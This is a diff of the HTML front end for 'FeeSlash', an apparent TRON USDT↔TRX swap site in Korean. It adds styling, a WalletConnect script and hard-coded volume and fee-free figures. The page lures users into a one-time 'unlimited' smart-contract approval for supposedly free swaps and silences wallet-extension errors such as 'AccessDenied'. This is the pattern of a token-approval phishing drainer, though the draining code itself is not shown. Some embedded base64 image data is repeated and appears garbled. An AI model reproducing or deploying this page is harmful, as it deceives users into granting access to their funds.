@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FeeSlash - USDT ↔ TRX Instant Swap</title>
+    <!-- OG Tags -->
     <meta property="og:title" content="FeeSlash - TRON USDT Swap">
     <meta property="og:description" content="Fast & Secure TRON USDT Swap with Low Fees. Instant Exchange, Energy Rental.">
     <meta property="og:image" content="https://feeslash.io/og-image.png">
@@ -21,8 +22,10 @@
     <script>tailwind.config={darkMode:'class',theme:{extend:{colors:{dark:'#030712'}}}}</script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- WalletConnect v2 TRON Bridge -->
     <script src="wc-tron.min.js"></script>
     <script>
+        // 지갑 확장 프로그램 에러 숨김
         window.addEventListener('error',function(e){if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0)){e.preventDefault();return true;}},true);
         window.addEventListener('unhandledrejection',function(e){var m=e.reason?e.reason.message||String(e.reason):'';if(m.indexOf('charAt')>=0||m.indexOf('animation')>=0||m.indexOf('TokenPocket')>=0||m.indexOf('inpage')>=0){e.preventDefault();}});
     </script>
@@ -36,46 +39,89 @@
         .no-scrollbar::-webkit-scrollbar{display:none}.no-scrollbar{-ms-overflow-style:none;scrollbar-width:none}
         @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}.fade-in{animation:fadeIn 0.3s ease-out}
         @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}.shimmer{background:linear-gradient(90deg,transparent 25%,rgba(255,255,255,0.05) 50%,transparent 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
+        
         .active-amt{background:linear-gradient(135deg,rgba(37,99,235,0.15),rgba(6,182,212,0.15))!important;color:#60a5fa!important;border-color:rgba(59,130,246,0.3)!important}
         .active-dur{background:linear-gradient(135deg,rgba(147,51,234,0.15),rgba(236,72,153,0.15))!important;color:#c084fc!important;border-color:rgba(147,51,234,0.3)!important}
         .step-progress{position:relative;overflow:hidden}.step-progress::after{content:'';position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,#3b82f6,#06b6d4);width:0;transition:width 0.6s ease}.step-done::after{width:100%}
+
+        /* ===== Light Theme Override ===== */
         :root{--bg:#f4f7fb;--card:#ffffff;--soft:#f8fafc;--bdr:#e2e8f0;--txt:#172033;--sub:#64748b;--blue:#2563eb;--shadow:0 18px 55px rgba(15,23,42,.07),0 4px 14px rgba(15,23,42,.04)}
         html,body{background:var(--bg)!important;color:var(--txt)!important}
         html.dark,body.bg-\[\#030712\]{background:var(--bg)!important}
         body.text-slate-100{color:var(--txt)!important}
+
+        /* Glass cards → white glass */
         .glass{background:rgba(255,255,255,0.85)!important;backdrop-filter:blur(20px)!important;border-color:var(--bdr)!important;box-shadow:var(--shadow)!important}
+
+        /* Header & Footer */
         header,.bg-\[\#050811\]\/90{background:rgba(255,255,255,0.92)!important;border-color:var(--bdr)!important}
         footer,.bg-\[\#020408\]{background:var(--soft)!important;border-color:var(--bdr)!important;color:var(--sub)!important}
+
+        /* Ticker bar */
         .bg-\[\#050811\]{background:var(--soft)!important;border-color:var(--bdr)!important}
+
+        /* Text overrides */
         .text-white{color:var(--txt)!important}
         .text-slate-100,.text-slate-200,.text-slate-300{color:#334155!important}
         .text-slate-400{color:var(--sub)!important}
         .text-slate-500{color:#94a3b8!important}
         .text-slate-600{color:#94a3b8!important}
+
+        /* Card inner panels */
         .bg-\[\#070b14\],.bg-\[\#070b14\]\/90{background:var(--soft)!important;border-color:var(--bdr)!important}
         .bg-slate-900\/80,.bg-slate-900\/60,.bg-slate-900{background:var(--soft)!important;border-color:var(--bdr)!important}
         .bg-slate-950\/80,.bg-slate-950\/60,.bg-slate-950\/40,.bg-slate-950{background:var(--soft)!important;border-color:var(--bdr)!important}
         .bg-slate-800\/80,.bg-slate-800\/60,.bg-slate-800{background:#e2e8f0!important}
+
+        /* Borders */
         .border-slate-800\/80,.border-slate-800\/60,.border-slate-800\/90,.border-slate-800,.border-slate-700\/80,.border-slate-700,.border-slate-950{border-color:var(--bdr)!important}
+
+        /* Buttons */
         .bg-slate-800:hover,.hover\:bg-slate-700:hover,.hover\:bg-slate-800:hover{background:#cbd5e1!important}
         button.bg-slate-800{background:#e2e8f0!important;color:var(--txt)!important}
+        #connect-btn,#approve-btn,#energy-rent-btn,#reward-modal button:last-child{color:#ffffff!important}
+
+        /* Logs panel */
         .bg-\[\#020408\]{background:#f1f5f9!important}
+
+        /* Modal */
         .modal-backdrop{background:rgba(0,0,0,0.35)!important}
         .modal-backdrop .glass{background:rgba(255,255,255,0.97)!important;border-color:var(--bdr)!important}
+
+        /* Wallet cards in modal */
         .wallet-card{background:var(--soft)!important;border-color:var(--bdr)!important}
         .wallet-card:hover{background:#e2e8f0!important;box-shadow:0 8px 30px rgba(0,0,0,0.08)!important}
+
+        /* Gradient text keep */
         .text-transparent.bg-clip-text{color:transparent!important}
+
+        /* Step cards */
         #step1,#step2,#step3{background:var(--soft)!important;border-color:var(--bdr)!important}
+        #step1.step-done,#step2.step-done,#step3.step-done{background:rgba(16,185,129,0.08)!important;border-color:rgba(16,185,129,0.4)!important}
+
+        /* Swap arrow */
         .bg-\[\#0f172a\]{background:var(--card)!important;border-color:var(--bdr)!important}
+
+        /* Toast */
         #toast-container div{background:rgba(255,255,255,0.95)!important;border-color:var(--bdr)!important;color:var(--txt)!important}
+
+        /* Background blobs */
         .fixed.bg-gradient-to-b{opacity:0.3!important}
         .fixed.bg-emerald-600\/5{opacity:0.15!important}
+
+        /* Selection */
         ::selection{background:#2563eb!important;color:#fff!important}
+
+        /* Percentage buttons */
         button.px-3.py-1\.5.rounded-lg{background:#e2e8f0!important;color:var(--sub)!important}
         button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
+
+        /* Badge colors keep */
         .bg-amber-500\/10{background:rgba(245,158,11,0.1)!important}
         .bg-emerald-500\/10{background:rgba(16,185,129,0.1)!important}
         .bg-blue-500\/10{background:rgba(59,130,246,0.1)!important}
+
+        /* Keep colored text */
         .text-emerald-400,.text-emerald-400.font-bold{color:#10b981!important}
         .text-blue-400{color:#2563eb!important}
         .text-amber-400{color:#d97706!important}
@@ -83,8 +129,14 @@
         .text-purple-400{color:#a855f7!important}
         .text-cyan-400{color:#06b6d4!important}
         .text-rose-400{color:#f43f5e!important}
+
+        /* Lang select */
         #lang-select{background:var(--soft)!important;border-color:var(--bdr)!important;color:var(--txt)!important}
+
+        /* Font mono in logs */
         .font-mono{color:inherit}
+
+        /* Scrollbar */
         ::-webkit-scrollbar{width:6px}
         ::-webkit-scrollbar-track{background:transparent}
         ::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:3px}
@@ -124,7 +176,7 @@
         </div>
     </header>
 
-    <!-- Wallet Selector Modal -->
+    <!-- ===== Wallet Selector Modal ===== -->
     <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
         <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh] fade-in">
             <div class="w-16 h-16 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
@@ -163,6 +215,7 @@
                     <div class="flex-1"><div class="text-sm font-bold text-white">imToken</div><div class="text-[11px] text-slate-400" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
+                <!-- WalletConnect 구분선 -->
                 <div class="flex items-center gap-3 pt-1"><div class="flex-1 border-t border-slate-700/60"></div><span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">또는</span><div class="flex-1 border-t border-slate-700/60"></div></div>
                 <button onclick="wcConnectFromModal()" class="wallet-card w-full bg-gradient-to-r from-blue-600/20 to-purple-600/20 hover:from-blue-600/30 hover:to-purple-600/30 border border-blue-500/40 rounded-2xl p-4 flex items-center gap-4 text-left">
                     <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/30 to-purple-500/20 border border-blue-400/40 flex items-center justify-center shrink-0"><i class="fa-solid fa-qrcode text-blue-300 text-lg"></i></div>
@@ -180,12 +233,12 @@
         </div>
     </div>
 
-    <!-- Reward Modal -->
+    <!-- ===== Reward Modal ===== -->
     <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
         <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative fade-in">
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
-            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">교환 승인 완료!</h3><p class="text-xs text-slate-300 leading-relaxed">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p></div>
+            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white" data-i18n="modal_success">교환 승인 완료!</h3><p class="text-xs text-slate-300 leading-relaxed" data-i18n="modal_desc">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p></div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
                 <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">승인 완료</span></div>
                 <div class="flex justify-between text-slate-400"><span>교환 한도:</span><span class="text-white">무제한</span></div>
@@ -208,20 +261,36 @@
             <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition">닫기</button>
         </div>
     </div>
-
     <main class="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 space-y-6 sm:space-y-8 flex-1 w-full overflow-x-hidden">
 
         <!-- Hero -->
         <section class="relative rounded-3xl p-4 sm:p-6 md:p-10 overflow-hidden glass border border-slate-800/80 shadow-2xl">
             <div class="absolute top-0 right-0 w-64 sm:w-96 h-64 sm:h-96 bg-blue-600/10 rounded-full blur-3xl pointer-events-none"></div>
-            <div class="relative z-10">
-                <div class="space-y-5">
+            <div class="relative z-10 grid grid-cols-1 lg:grid-cols-12 gap-6 items-center">
+                <div class="lg:col-span-8 space-y-5">
                     <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] sm:text-xs font-semibold"><i class="fa-solid fa-arrow-right-arrow-left"></i><span data-i18n="hero_badge">TRON MAINNET INSTANT SWAP</span></div>
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]" data-i18n="hero_title1">USDT ↔ TRX<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-300 to-emerald-300" data-i18n="hero_title2">무료 교환</span></h2>
+                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]"><span data-i18n="hero_title1">USDT ↔ TRX</span><br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-300 to-emerald-300" data-i18n="hero_title2">무료 교환</span></h2>
                     <p class="text-slate-300 text-sm sm:text-base leading-relaxed max-w-xl" data-i18n="hero_desc">수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.</p>
                     <div class="pt-2 space-y-2 max-w-xl">
                         <div class="flex justify-between text-[10px] sm:text-xs font-semibold gap-2"><span class="text-slate-400 shrink-0" data-i18n="today_volume">오늘 총 교환량</span><span id="today-volume-val" class="text-blue-400 font-mono truncate">--- USDT → --- TRX</span></div>
                         <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-blue-600 via-cyan-400 to-emerald-400 h-full rounded-full w-[73.7%]"></div></div>
+                    </div>
+                </div>
+                <!-- 백업본 핵심 지표 카드 복원 -->
+                <div class="lg:col-span-4 grid grid-cols-2 lg:grid-cols-1 gap-3">
+                    <div class="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between">
+                        <div>
+                            <div class="text-[11px] text-slate-400" data-i18n="swap_count">교환 건수</div>
+                            <div class="text-lg sm:text-xl font-extrabold text-white font-mono mt-0.5" data-i18n="swap_count_val">18,492 건</div>
+                        </div>
+                        <div class="w-10 h-10 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400"><i class="fa-solid fa-chart-line"></i></div>
+                    </div>
+                    <div class="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between">
+                        <div>
+                            <div class="text-[11px] text-slate-400" data-i18n="fee_label">수수료</div>
+                            <div class="text-lg sm:text-xl font-extrabold text-emerald-400 font-mono mt-0.5" data-i18n="free_event">수수료 무료</div>
+                        </div>
+                        <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400"><i class="fa-solid fa-percent"></i></div>
                     </div>
                 </div>
             </div>
@@ -236,13 +305,13 @@
                 </div>
                 <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-5 space-y-3 mb-3">
                     <div class="flex items-center justify-between text-sm text-slate-400"><span data-i18n="send_amount">보내는 금액 (USDT)</span><span><span data-i18n="bal">잔액</span>: <span id="usdt-bal-swap" class="text-emerald-400 font-bold font-mono">0.00</span><span id="send-bal-suffix"></span></span></div>
-                    <div class="flex items-center gap-2 sm:gap-3"><input type="number" id="swap-input" placeholder="0.00" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl sm:text-4xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0"><div class="flex items-center gap-1.5 sm:gap-2 bg-slate-800/80 px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl border border-slate-700/80 shrink-0"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAYAAACOEfKtAAAzK0lEQVR42uW9d7hd13me+fvW2nuffm5vuBe4aBckABaQIiWKEglSJimrWLYSg7JiJbJie5I4zsRxJnGqQDiTxBnbGT+TRH7sxHG3LEJxbMuSJVEUCZGiJFawAQQIogO3t3NP22Wtb/7YByQ1koua40kOnvWcjXMLznn3V9/vXQvC/9iHcPCg4PDDhjt6rxwbVfbsUe67TzFGAfBeuPdew54FefUnj40q9x/2CMr/Uo+DBw0HDwaomq9GEsyfsqS3vv5N2B9w4ID9k7/lO2kBfxEPRbjvoOW++xwiegWMvwaVT95559bVormagtlFKFtBxwmDQUJbJDAhiEO1g9DAmHnS7CxR6eUgLJ4s1Tiz8e9+c/mrbDAHEg4fdv//B/DgQcPeY8K9+YcxwMiP/I2981fPvI36wF3EzX2sr04GZHbUBvT3D1AvlwgG+qBQxAskBjppQpymrPuEZmuNdGmZbHEJmp1F4uwUwsOUSp/j+rGv8Dd+vvVVYB4+7OE75+byHQPu2DHh8GEnwNa3vW3szJ4df5WJiQ+wdfqm8u494ZuGJrgGx24RN1CpOl+uajMMaYtI0zm6SSLNLGPdZ3TUk3ivG3FMO+tq3GlJc33ZtOYuByuzl+heuoB2NtAsPUMn+xzNzq/zO3/8xVffz/0HLPd+Z4CUb/vvu/+A4d4cuIF3vnP3yqaRH2Nq9H1258zILTO7+b7Jrf67B4ay6UKBVIy5AHJGPWddxopLablMu1kmmXM0fcaG8yTe0UlT0iRFnQcPzjuM9zRxvtFu+o2FizZevBikrTXc6ira3HiclfYv8V9//6NABxH42Mcs997r/nICePCg4ad/2qPK8LveNbM03vdPGCy/f3DfG0pvv+5mDkxuS97UNyhlg2lnTjoomRi61ugKsAQsJwnrna60XaqtJKblnDiUzFgyFFS1laRsZBmtJKbZ3JBOnGgSd0nTlE7S1U7W9WHashp1bMeluMurJ5hb+AV+5r/+ikCqqhbwiOhfHgAfeijgzjuznVA4/3c/+FPJSPkfVq/aVf/ePW/wd267Nhuv9Vvxnsg5GTNWh62RFDjdaukTc7M8f+kiF8+eZfH8eVldXCRpNjVrdVD1ItZouVSmVq7JYP+gVkaHsaPDBCPDRLWatICLzQbnVxa1vbYGcSyy0cEkqSuP1bR+1ZZotWRptFaeYf78P+H9hz6bu/X93xZr/FYBlAOq5rCIq/2DD96ysXniF9kyvu+ubbv1fTtuTKVv2Fz0XgKXyWYb6RaDrG809AtnX+Gxp57kuWeeov3CcVhZBvVQLkC5CJVSfm0ERMB7yBRiJ8QZpJkSFhkeHWPrlm0ycPXVJKODLLebnLs8y8bCgtLqYNsx5Sjyk7fc4Ou37Cms1gwX1jq/1v3IL/4UP/9bCzx0MODOQ9n/GABf57KDf/ixf7AyEf6bAeOLByevT24Z3mmPC1x2CaEJKImhsbTIk19+jAc++wmazx2FbgxjgwQzm5GtEzBYw1tBuymSebSbQJJCmiHOXSmH0MBAYEW7oOttZWFN2Ii1VKvLlu0zjI6PE4O+cvkSy401qNUpDw+yfXKT37ljWvS6a4PHVy+fm33iU3+Ld/yDz/Qs8ZtOMPJNg3fopz1ocd+RB365ffWWvz7eWXU/O3yVH6j020BuLtKqkIblOcb8OMef1BQe/8pR+ZvJJSqOdNfus5//CT53cc/N/BkTn+6+069yfZU+0yy1esGPDlbcPDPYsT6WDoLuj2/LOqT3c6isa3HiclfYv8V9//6NABxH42Mcs997r/nICePCg4ad/2qPK8LveNbM03vdPGCy/f3DfG0pvv+5mDkxuS97UNyhlg2lnTjoomRi61ugKsAQsJwnrna60XaqtJKblnDiUzFgyFFS1laRsZBmtJKbZ3JBOnGgSd0nTlE7S1U7W9WHashp1bMeluMurJ5hb+AV+5r/+ikCqqhbwiOhfHgAfeijgzjuznVA4/3c/+FPJSPkfVq/aVf/ePW/wd267Nhuv9Vvxnsg5GTNWh62RFDjdaukTc7M8f+kiF8+eZfH8eVldXCRpNjVrdVD1ItZouVSmVq7JYP+gVkaHsaPDBCPDRLWatICLzQbnVxa1vbYGcSyy0cEkqSuP1bR+1ZZotWRptFaeYf78P+H9hz6bu/X93xZr/FYBlAOq5rCIq/2DD96ysXniF9kyvu+ubbv1fTtuTKVv2Fz0XgKXyWYb6RaDrG809AtnX+Gxp57kuWeeov3CcVhZBvVQLkC5CJVSfm0ERMB7yBRiJ8QZpJkSFhkeHWPrlm0ycPXVJKODLLebnLs8y8bCgtLqYNsx5Sjyk7fc4Ou37Cms1gwX1jq/1v3IL/4UP/9bCzx0MODOQ9n/GABf57KDf/ixf7AyEf6bAeOLByevT24Z3mmPC1x2CaEJKImhsbTIk19+jAc++wmazx2FbgxjgwQzm5GtEzBYw1tBuymSebSbQJJCmiHOXSmH0MBAYEW7oOttZWFN2Ii1VKvLlu0zjI6PE4O+cvkSy401qNUpDw+yfXKT37ljWvS6a4PHVy+fm33iU3+Ld/yDz/Qs8ZtOMPJNg3fopz1ocd+RB365ffWWvz7eWXU/O3yVH6j020BuLtKqkIblOcb8OMef1BQe/8pR+ZvJJSqOdNfus5//CT53cc/N/BkTn+6+069yfZU+0yy1esGPDlbcPDPYsT6WDoLuj2/LOqT3c6isa3HiclfYv8V9//6NABxH42Mcs997r/nICePCg4ad/2qPK8LveNbM03vdPGCy/f3DfG0pvv+5mDkxuS97UNyhlg2lnTjoomRi61ugKsAQsJwnrna60XaqtJKblnDiUzFgyFFS1laRsZBmtJKbZ3JBOnGgSd0nTlE7S1U7W9WHashp1bMeluMurJ5hb+AV+5r/+ikCqqhbwiOhfHgAfeijgzjuznVA4/3c/+FPJSPkfVq/aVf/ePW/wd267Nhuv9Vvxnsg5GTNWh62RFDjdaukTc7M8f+kiF8+eZfH8eVldXCRpNjVrdVD1ItZouVSmVq7JYP+gVkaHsaPDBCPDRLWatICLzQbnVxa1vbYGcSyy0cEkqSuP1bR+1ZZotWRptFaeYf78P+H9hz6bu/X93xZr/FYBlAOq5rCIq/2DD96ysXniF9kyvu+ubbv1fTtuTKVv2Fz0XgKXyWYb6RaDrG809AtnX+Gxp57kuWeeov3CcVhZBvVQLkC5CJVSfm0ERMB7yBRiJ8QZpJkSFhkeHWPrlm0ycPXVJKODLLebnLs8y8bCgtLqYNsx5Sjyk7fc4Ou37Cms1gwX1jq/1v3IL/4UP/9bCzx0MODOQ9n/GABf57KDf/ixf7AyEf6bAeOLByevT24Z3mmPC1x2CaEJKImhsbTIk19+jAc++wmazx2FbgxjgwQzm5GtEzBYw1tBuymSebSbQJJCmiHOXSmH0MBAYEW7oOttZWFN2Ii1VKvLlu0zjI6PE4O+cvkSy401qNUpDw+yfXKT37ljWvS6a4PHVy+fm33iU3+Ld/yDz/Qs8ZtOMPJNg3fopz1ocd+RB365ffWWvz7eWXU/O3yVH6j020BuLtKqkIblOcb8OMef1BQe/8pR+ZvJJSqOdNfus5//CT53cc/N/BkTn+6+069yfZU+0yy1esGPDlbcPDPYsT6WDoLuj2/LOqT3c6isa3Hiclf" alt="USDT" id="send-coin-img" class="w-7 h-7 rounded-full"><span id="send-coin-name" class="text-base font-bold text-white">USDT</span></div></div>
+                    <div class="flex items-center gap-2 sm:gap-3"><input type="number" id="swap-input" placeholder="0.00" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl sm:text-4xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0"><div class="flex items-center gap-1.5 sm:gap-2 bg-slate-800/80 px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl border border-slate-700/80 shrink-0"><img src="data:image/png;base64,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